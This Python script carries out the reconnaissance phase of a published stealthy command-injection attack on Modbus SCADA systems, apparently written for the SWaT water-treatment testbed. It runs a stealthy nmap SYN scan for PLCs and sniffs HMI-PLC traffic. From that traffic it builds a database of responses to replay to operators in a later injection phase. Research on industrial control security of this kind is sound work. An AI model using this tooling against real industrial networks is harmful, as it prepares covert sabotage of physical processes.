#!/usr/bin/env python3
"""
phase0_recon.py — SWaT P1 Attack: Phase 0 - Network Reconnaissance & Sniffing
===============================================================================
Based on: Alsabbagh et al., "A Stealthy False Command Injection Attack on
          Modbus based SCADA Systems", IEEE CCNC 2023 (Paper #9)

PURPOSE:
  1. Discover Modbus devices on the SWaT Level 1/2 network via NMAP SYN scan
  2. Sniff Modbus TCP traffic and build a request-response pair database
     (used in Phase 2 to replay fake responses to the SCADA HMI)

USAGE:
  sudo python3 phase0_recon.py --subnet 192.168.1.0/24 --iface eth0 --duration 1800

REQUIREMENTS:
  pip install scapy pymodbus python-nmap
  Must be run as root (raw socket capture)

NOTE: For use only on the SWaT testbed with iTrust lab engineer present.
"""

import argparse
import json
import os
import time
import pickle
from datetime import datetime
from collections import defaultdict

# --- Imports ---
try:
    from scapy.all import sniff, wrpcap, rdpcap, TCP, Raw
    from scapy.layers.inet import IP
except ImportError:
    print("[!] scapy not installed. Run: pip install scapy")
    exit(1)

try:
    import nmap
except ImportError:
    print("[!] python-nmap not installed. Run: pip install python-nmap")
    exit(1)


# ─────────────────────────────────────────────────────────────────────────────
# STEP 1: Network Reconnaissance (NMAP SYN Scan)
# ─────────────────────────────────────────────────────────────────────────────
def run_nmap_recon(subnet: str) -> dict:
    """
    SYN scan the subnet for Modbus devices on port 502.
    SYN (half-open) scan avoids completing the TCP handshake — harder to detect
    by default firewall rules (as described in Paper #9, Section IV-A-1).
    """
    print(f"\n[*] Phase 0.1: NMAP SYN scan on {subnet} port 502...")
    nm = nmap.PortScanner()

    # -sS: SYN scan (half-open, stealthy)
    # -p 502: Modbus TCP port
    # -sV: version detection
    # -O: OS detection
    nm.scan(hosts=subnet, ports='502', arguments='-sS -sV -O --open')

    devices = {}
    for host in nm.all_hosts():
        if nm[host].state() == 'up':
            port_info = nm[host].get('tcp', {}).get(502, {})
            if port_info.get('state') == 'open':
                devices[host] = {
                    'mac':     nm[host].get('addresses', {}).get('mac', 'unknown'),
                    'os':      nm[host].get('osmatch', [{}])[0].get('name', 'unknown'),
                    'service': port_info.get('name', 'modbus'),
                    'version': port_info.get('version', ''),
                }
                print(f"  [+] Modbus device found: {host}")
                print(f"      MAC: {devices[host]['mac']}")
                print(f"      OS:  {devices[host]['os']}")

    if not devices:
        print("  [-] No Modbus devices found. Check subnet and interface.")
    return devices


# ─────────────────────────────────────────────────────────────────────────────
# STEP 2: Sniff & Build Request-Response Database
# ─────────────────────────────────────────────────────────────────────────────
def parse_modbus_frame(payload: bytes) -> dict | None:
    """
    Parse a raw Modbus TCP Application Data Unit (ADU).

    Modbus TCP frame format (from Paper #9 Fig. 2):
    ┌──────────────┬──────────────┬──────────────┬───────────┬───────────┬──────────────┐
    │ Trans ID (2B)│ Proto ID (2B)│  Length (2B) │ Unit ID(1)│ Func(1B)  │  Data (n B)  │
    └──────────────┴──────────────┴──────────────┴───────────┴───────────┴──────────────┘

    Matching key from paper: (Transaction ID, Unit ID, Function Code)
    """
    if len(payload) < 8:
        return None
    try:
        trans_id   = int.from_bytes(payload[0:2], 'big')
        proto_id   = int.from_bytes(payload[2:4], 'big')
        length     = int.from_bytes(payload[4:6], 'big')
        unit_id    = payload[6]
        func_code  = payload[7]
        data       = payload[8:]

        if proto_id != 0:          # Modbus protocol identifier must be 0x0000
            return None

        return {
            'trans_id':  trans_id,
            'proto_id':  proto_id,
            'length':    length,
            'unit_id':   unit_id,
            'func_code': func_code,
            'data':      data.hex(),
            'raw':       payload.hex(),
        }
    except Exception:
        return None


class ModbusDatabase:
    """
    Stores request-response pairs keyed by (trans_id, unit_id, func_code).
    Duplicates are eliminated as described in Paper #9 Section IV-A-2.
    """
    def __init__(self):
        # key: (unit_id, func_code) → list of (request_raw, response_raw)
        # We drop trans_id from the key since it rotates — we match on content
        self.pairs: dict = {}
        self.raw_requests: dict = {}   # trans_id → request frame
        self.raw_responses: dict = {}  # trans_id → response frame
        self.plc_ip: str = ""
        self.hmi_ip: str = ""

    def add_packet(self, src_ip: str, dst_ip: str, payload: bytes):
        frame = parse_modbus_frame(payload)
        if not frame:
            return

        tid = frame['trans_id']

        if dst_ip == self.plc_ip:
            # HMI → PLC: this is a request
            self.raw_requests[tid] = frame
        elif src_ip == self.plc_ip:
            # PLC → HMI: this is a response
            self.raw_responses[tid] = frame
            # Try to pair with stored request
            if tid in self.raw_requests:
                req = self.raw_requests[tid]
                key = (req['unit_id'], req['func_code'])
                if key not in self.pairs:
                    self.pairs[key] = {
                        'request':  req,
                        'response': frame,
                    }
                    print(f"  [+] New pair: unit={req['unit_id']} func=0x{req['func_code']:02X} "
                          f"→ {self._func_name(req['func_code'])}")

    def lookup(self, unit_id: int, func_code: int) -> dict | None:
        """Return stored response for a given (unit_id, func_code)."""
        return self.pairs.get((unit_id, func_code))

    def _func_name(self, fc: int) -> str:
        names = {
            0x01: 'Read Coil Status',
            0x02: 'Read Discrete Input',
            0x03: 'Read Holding Registers',
            0x04: 'Read Input Registers',
            0x05: 'Write Single Coil',
            0x06: 'Write Single Register',
            0x0F: 'Write Multiple Coils',
            0x10: 'Write Multiple Registers',
        }
        return names.get(fc, f'Unknown(0x{fc:02X})')

    def save(self, path: str):
        with open(path, 'wb') as f:
            pickle.dump(self, f)
        print(f"\n[*] Database saved → {path}")
        print(f"    Total unique pairs: {len(self.pairs)}")
        for key, val in self.pairs.items():
            print(f"    unit={key[0]} func=0x{key[1]:02X} "
                  f"({self._func_name(key[1])})")

    @staticmethod
    def load(path: str) -> 'ModbusDatabase':
        with open(path, 'rb') as f:
            return pickle.load(f)


def sniff_and_build_db(iface: str, plc_ip: str, hmi_ip: str,
                       duration: int, pcap_out: str, db_out: str):
    """
    Capture Modbus TCP traffic for `duration` seconds and build the pair DB.
    """
    print(f"\n[*] Phase 0.2: Sniffing Modbus traffic for {duration}s "
          f"on {iface}...")
    print(f"    HMI: {hmi_ip}  |  PLC: {plc_ip}")

    db = ModbusDatabase()
    db.plc_ip = plc_ip
    db.hmi_ip = hmi_ip

    captured = []

    def packet_handler(pkt):
        if TCP not in pkt or pkt[TCP].dport not in (502,) and pkt[TCP].sport not in (502,):
            return
        if Raw not in pkt:
            return
        src = pkt[IP].src
        dst = pkt[IP].dst
        payload = bytes(pkt[Raw])
        captured.append(pkt)
        db.add_packet(src, dst, payload)

    sniff(iface=iface,
          filter=f"tcp port 502",
          prn=packet_handler,
          timeout=duration,
          store=False)

    # Save raw pcap
    wrpcap(pcap_out, captured)
    print(f"[*] Raw capture saved → {pcap_out} ({len(captured)} packets)")

    # Save pair database
    db.save(db_out)
    return db


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description='Phase 0: SWaT Modbus Recon & Database Builder')
    parser.add_argument('--subnet',   default='192.168.1.0/24',
                        help='Subnet to scan (NMAP)')
    parser.add_argument('--iface',    default='eth0',
                        help='Network interface to sniff on')
    parser.add_argument('--plc-ip',   default='',
                        help='PLC1 IP (auto-detected if blank)')
    parser.add_argument('--hmi-ip',   default='',
                        help='HMI IP (auto-detected if blank)')
    parser.add_argument('--duration', type=int, default=1800,
                        help='Sniff duration in seconds (default: 1800 = 30min)')
    parser.add_argument('--pcap-out', default='swat_capture.pcap',
                        help='Output pcap file')
    parser.add_argument('--db-out',   default='modbus_db.pkl',
                        help='Output request-response database file')
    args = parser.parse_args()

    print("=" * 60)
    print("  SWaT P1 Attack — Phase 0: Reconnaissance")
    print("  Based on Alsabbagh et al., IEEE CCNC 2023")
    print("=" * 60)

    # Step 1: NMAP
    devices = run_nmap_recon(args.subnet)

    plc_ip = args.plc_ip
    hmi_ip = args.hmi_ip

    if not plc_ip and devices:
        plc_ip = list(devices.keys())[0]
        print(f"[*] Auto-selected PLC IP: {plc_ip}")

    if not plc_ip:
        print("[!] No PLC IP found. Specify with --plc-ip")
        return

    # Step 2: Sniff
    db = sniff_and_build_db(
        iface=args.iface,
        plc_ip=plc_ip,
        hmi_ip=hmi_ip,
        duration=args.duration,
        pcap_out=args.pcap_out,
        db_out=args.db_out,
    )

    # Save device info
    meta = {
        'timestamp': datetime.now().isoformat(),
        'devices':   devices,
        'plc_ip':    plc_ip,
        'hmi_ip':    hmi_ip,
        'pairs':     len(db.pairs),
    }
    with open('recon_results.json', 'w') as f:
        json.dump(meta, f, indent=2)
    print("\n[*] Recon metadata → recon_results.json")
    print("[*] Phase 0 complete. Run phase1_inject.py next.\n")


if __name__ == '__main__':
    if os.geteuid() != 0:
        print("[!] Must run as root for raw socket access.")
        exit(1)
    main()
